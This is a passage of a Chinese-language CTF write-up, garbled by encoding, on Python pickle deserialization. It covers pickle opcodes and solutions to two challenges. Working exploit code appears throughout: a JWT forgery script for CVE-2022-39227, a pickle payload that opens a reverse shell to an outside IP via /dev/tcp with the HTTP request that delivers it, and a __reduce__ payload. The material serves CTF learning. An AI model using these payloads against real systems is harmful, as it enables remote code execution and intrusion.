ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨</td><td align="left">l</td><td align="left">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">]</td><td align="left">å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨</td><td align="left">]</td><td align="left">ç©ºåˆ—è¡¨å…¥æ ˆ</td></tr><tr><td align="left">d</td><td align="left">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰</td><td align="left">d</td><td align="left">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">}</td><td align="left">å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸</td><td align="left">}</td><td align="left">ç©ºå­—å…¸å…¥æ ˆ</td></tr><tr><td align="left">p</td><td align="left">å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³memo_n</td><td align="left">pn\n</td><td align="left">æ— </td></tr><tr><td align="left">g</td><td align="left">å°†memo_nçš„å¯¹è±¡å‹æ ˆ</td><td align="left">gn\n</td><td align="left">å¯¹è±¡è¢«å‹æ ˆ</td></tr><tr><td align="left">0</td><td align="left">ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡</td><td align="left">0</td><td align="left">æ ˆé¡¶å¯¹è±¡è¢«ä¸¢å¼ƒ</td></tr><tr><td align="left">b</td><td align="left">ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ªå±æ€§å: å±æ€§å€¼çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½®</td><td align="left">b</td><td align="left">æ ˆä¸Šç¬¬ä¸€ä¸ªå…ƒç´ å‡ºæ ˆ</td></tr><tr><td align="left">s</td><td align="left">å°†æ ˆçš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºkey-valueå¯¹ï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸ºkeyï¼‰ä¸­</td><td align="left">s</td><td align="left">ç¬¬ä¸€ã€äºŒä¸ªå…ƒç´ å‡ºæ ˆï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨æˆ–å­—å…¸ï¼‰æ·»åŠ æ–°å€¼æˆ–è¢«æ›´æ–°</td></tr><tr><td align="left">u</td><td align="left">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­</td><td align="left">u</td><td align="left">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œå­—å…¸è¢«æ›´æ–°</td></tr><tr><td align="left">a</td><td align="left">å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ appendåˆ°ç¬¬äºŒä¸ªå…ƒç´ (åˆ—è¡¨)ä¸­</td><td align="left">a</td><td align="left">æ ˆé¡¶å…ƒç´ å‡ºæ ˆï¼Œç¬¬äºŒä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨ï¼‰è¢«æ›´æ–°</td></tr><tr><td align="left">e</td><td align="left">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶extendsåˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­</td><td align="left">e</td><td align="left">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œåˆ—è¡¨è¢«æ›´æ–°</td></tr></tbody></table><h2 id="å‡½æ•°æ‰§è¡Œopcodeæ„é€ "><a href="#å‡½æ•°æ‰§è¡Œopcodeæ„é€ " class="headerlink" title="å‡½æ•°æ‰§è¡Œopcodeæ„é€ "></a>å‡½æ•°æ‰§è¡Œopcodeæ„é€ </h2><p><code>R</code> :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;cos      # ä½¿ç”¨cæ¥import osæ¨¡å—</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;   # (å‹å…¥markæ ‡è®°   Så®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</span><br><span class="line">tR.&#x27;&#x27;&#x27; # å¯»æ‰¾ä¸Šä¸€ä¸ªmarkæ ‡è®°å¹¶å°†ä¹‹é—´çš„æ•°æ®åˆå¹¶ä¸ºä¸€ä¸ªå…ƒç»„ å³(&#x27;whoami&#x27;,)</span><br><span class="line"> # Ré€‰æ‹©ç¬¬ä¸€ä¸ªå¯¹è±¡ä¸ºå‡½æ•°,ç¬¬äºŒä¸ªå¯¹è±¡ä¸ºå‚æ•° å³os.system(&#x27;whoami&#x27;,)</span><br></pre></td></tr></table></figure><p><code>o</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(cos  # ä½¿ç”¨cæ¥import osæ¨¡å—</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27; # Så®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</span><br><span class="line">o.&#x27;&#x27;&#x27;  # oå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰å³ os.system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure><p><code>i</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;  # (å‹å…¥markæ ‡è®°   Så®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</span><br><span class="line">ios# iç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ¬è¿ä¸¤å¼ PVMè§£æopcodeçš„åŠ¨å›¾æ¼”ç¤º</p><ul><li>PVMè§£æ <code>str</code> çš„è¿‡ç¨‹</li></ul><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/20200320230631-6204866e-6abc-1.gif"></p><ul><li>PVMè§£æ <code>__reduce__()</code> çš„è¿‡ç¨‹</li></ul><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/20200320230711-7972c0ea-6abc-1.gif"></p><h2 id="Pkerå·¥å…·"><a href="#Pkerå·¥å…·" class="headerlink" title="Pkerå·¥å…·"></a>Pkerå·¥å…·</h2><p><a href="https://github.com/eddieivan01/pker">https://github.com/eddieivan01/pker</a></p><p>ä½¿ç”¨è„šæœ¬æ¥ç”Ÿæˆæˆ‘ä»¬éœ€è¦çš„opcode</p><h2 id="æ¡ˆä¾‹"><a href="#æ¡ˆä¾‹" class="headerlink" title="æ¡ˆä¾‹:"></a>æ¡ˆä¾‹:</h2><h3 id="New-star-2023-Yeâ€™s-Pickle"><a href="#New-star-2023-Yeâ€™s-Pickle" class="headerlink" title="New star 2023 Yeâ€™s Pickle"></a>New star 2023 Yeâ€™s Pickle</h3><p>é¢˜ç›®ç»™å‡ºäº†é™„ä»¶</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> jwcrypto.jwk <span class="keyword">as</span> jwk</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> python_jwt <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>(<span class="params">length=<span class="number">16</span></span>):</span><br><span class="line">    characters = string.ascii_letters + string.digits  <span class="comment"># åŒ…å«å­—æ¯å’Œæ•°å­—</span></span><br><span class="line">    random_string = <span class="string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">    <span class="keyword">return</span> random_string</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = generate_random_string(<span class="number">16</span>)</span><br><span class="line">key = jwk.JWK.generate(kty=<span class="string">&#x27;RSA&#x27;</span>, size=<span class="number">2048</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    payload=request.args.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        token=verify_jwt(payload, key, [<span class="string">&#x27;PS256&#x27;</span>])</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=token[<span class="number">1</span>][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=<span class="string">&quot;guest&quot;</span></span><br><span class="line">        user=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;boogipop&quot;</span>,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">        jwt = generate_jwt(user, key, <span class="string">&#x27;PS256&#x27;</span>, timedelta(minutes=<span class="number">60</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,token=jwt)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pickle&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unser</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&quot;role&quot;</span>]==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        pickle.loads(base64.b64decode(request.args.get(<span class="string">&quot;pickle&quot;</span>)))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹ä¼šè¿”å›ä¸€ä¸ªjwt token è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªcveçš„åˆ©ç”¨</p><p>CVE-2022-39227</p><p>ç›´æ¥ç”¨ç½‘ä¸Šçš„åˆ©ç”¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line"><span class="keyword">from</span> jwcrypto.common <span class="keyword">import</span> base64url_encode, base64url_decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">topic</span>(<span class="params">topic</span>):</span><br><span class="line">    [header, payload, signature] = topic.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">    <span class="built_in">print</span>(parsed_payload)</span><br><span class="line">    parsed_payload[<span class="string">&quot;role&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>)))</span><br><span class="line">    fake_payload = base64url_encode((dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">    <span class="built_in">print</span>(fake_payload)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot; &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125; &#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(topic(<span class="string">&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDkxNDA5MjEsImlhdCI6MTcwOTEzNzMyMSwianRpIjoic0t1bEt5Q0VJSXFORDN2R3pKeGVqdyIsIm5iZiI6MTcwOTEzNzMyMSwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.OfLoye4xwPW_8a7iakPPOXc9ki4EcbfTMG4Swm0Bo_9p6Wv5ZM0hGimwUKgweMNEsnUl6xXi47QIEaUSc2tS2CIchYHJs3quH0odaQoxlulyE3IOYh0-NzQfTymeqsmbejweyEQ1FiRjKyBgVNFL7eZa8ESp_2CIzeYmCmaaTjDfwVhgm7O6wTfwVoX4qjtPitQ-NWaSQ3lwQtXyveOGx3mqWiWY2d_STalqDv3bnUNyOkxXywkOpYM-OtVzY48lTD7m3BQTHLQ93C_3QYOHk_KzMDitnsekdC3gw3eDYdiVq8BruDgXrKHK7lxVBvvVFRv-NIwoO-E7wK1ukzC0gg&#x27;</span>))</span><br></pre></td></tr></table></figure><p>å°†ç»“æœä½œä¸ºå‚æ•°tokençš„å€¼,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?token=&#123;&quot; eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDkxNDA2NDQsImlhdCI6MTcwOTEzNzA0NCwianRpIjoiNTZIUkVWbGgwNzgyb3JuNWhlRGY1dyIsIm5iZiI6MTcwOTEzNzA0NCwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9&quot;, &quot;payload&quot;:&quot;eyJleHAiOjE3MDkxNDA2NDQsImlhdCI6MTcwOTEzNzA0NCwianRpIjoiNTZIUkVWbGgwNzgyb3JuNWhlRGY1dyIsIm5iZiI6MTcwOTEzNzA0NCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9&quot;,&quot;signature&quot;:&quot;OXsPZvXsGqKReQFv9FMYwneKop1D757MA1WmPG4IsOze9An4tQtDGu3zycahr6EL0Xn-rcToH0hGyH4i9dt3jnWPxNTrqR1QRIclAOeGinN9wBnxyECNZf8_0gBGhazgvSdB2lHwLsuVoR2mSMndPhCMz9oJPATVqmpfhveYiT9N7uGTUJbbrXXaEF3BPU2T0vOChhDmqZGUw93qy5lIkxMhnSa6plSPovDdBv1aUKmWoGmy_TRAkFesL1NKjv7Wi0QjdcUge96Fv3mmqMp9_G-iafz7u9Ot-YyJ9VsOGqi_vBov6fTFZnJSzAwv49DgIeuVxa2sKtzR8970nk_owg&quot;&#125;</span><br></pre></td></tr></table></figure><p>ä¼šè¿”å›ä¸€ä¸ªsession, å°±æ˜¯adminçš„session</p><p>æ­¤æ—¶å°±å¯ä»¥å–pickleè¿™ä¸ªè·¯ç”±ä¸‹è¿›è¡Œpickle</p><p>è¿™é‡Œä¸ä¼šå›æ˜¾, å› æ­¤éœ€è¦ä½¿ç”¨opcodeæ„é€ ä¸€ä¸ªåå¼¹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/107.148.75.202/1234 0&gt;&amp;1\&quot;&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = base64.b64encode(opcode)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>bâ€™Y29zCnN5c3RlbQooUydiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwNy4xNDguNzUuMjAyLzEyMzQgMD4mMSInCnRSLg&#x3D;&#x3D;â€™</p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/pickle?pickle=Y29zCnN5c3RlbQooUydiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwNy4xNDguNzUuMjAyLzEyMzQgMD4mMSInCnRSLg==</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>300e864c-da01-4bab-9750-6b5949530b2c.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=eyJyb2xlIjoiYWRtaW4ifQ.Zd9egg.OdEGNtZQIeC9-nt3MzZmcX_uDRY</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229004733728.png" alt="image-20240229004733728"></p><p>å¾—åˆ°flag</p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h2><p>è¿›å»åå¯ä»¥æ³¨å†Œç™»å½•, è¿™äº›åœ°æ–¹éƒ½æµ‹ä¸å‡ºä»€ä¹ˆæ¼æ´</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229133317018.png" alt="image-20240229133317018"></p><p>çœ‹äº†åŠå¤©, è¿™é‡Œè¦æ±‚ä¹°åˆ°lv6, ç¿»äº†å‡ é¡µéƒ½æ²¡æœ‰lv6, åœ¨static&#x2F;imgç›®å½•ä¸‹lv6.pngç¡®å®å­˜åœ¨. è¿™é‡Œéœ€è¦ç”¨pythonè„šæœ¬è·‘ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://e1b204f5-1beb-46b5-bf6b-9362c6510dfe.node5.buuoj.cn:81/shop?page=&#123;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    res = requests.get(url=url.<span class="built_in">format</span>(<span class="built_in">str</span>(i)))</span><br><span class="line">   <span class="comment"># print(res.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°lv6.pngåœ¨page&#x3D;181</p><p>ä¹‹åæ˜¯ä¿®æ”¹æŠ˜æ‰£ä¿¡æ¯æ¥è´­ä¹°</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229160429059.png" alt="image-20240229160429059"></p><p>å°†dicountä¿®æ”¹ä¸ºä¸€ä¸ªå¾ˆå°çš„æ•°</p><p>è®¿é—®è¿”å›çš„&#x2F;b1g_m4mberæç¤ºéœ€è¦admin, è¿™é‡Œç”¨<a href="https://jwt.io/">https://jwt.io/</a> å’Œc-jwt-cracker æ¥ä¼ªé€ jwt</p><p>jwt ç§é’¥ç ´è§£</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229150958381.png" alt="image-20240229150958381"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229160701863.png" alt="image-20240229160701863"></p><p>ä¹‹åå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç½‘ç«™å¤‡ä»½</p><p>æ¶‰åŠpickleçš„æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (os.listdir,(<span class="string">&quot;/&quot;</span>,))</span><br><span class="line"> </span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(a))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦åœ¨python2ç¯å¢ƒä¸‹è¿›è¡Œ, python3é‡Œç”Ÿæˆçš„payloadå¹¶ä¸å¥æ•ˆ</p><p>è¿™é‡Œå¹¶ä¸èƒ½ä½¿ç”¨os.systemæ¥æ‰§è¡Œå‘½ä»¤, ä¸çŸ¥é“ä¸ºä»€ä¹ˆ..</p><p>ç”Ÿæˆpayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cposix%0Alistdir%0Ap0%0A%28S%27/%27%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure><p><img 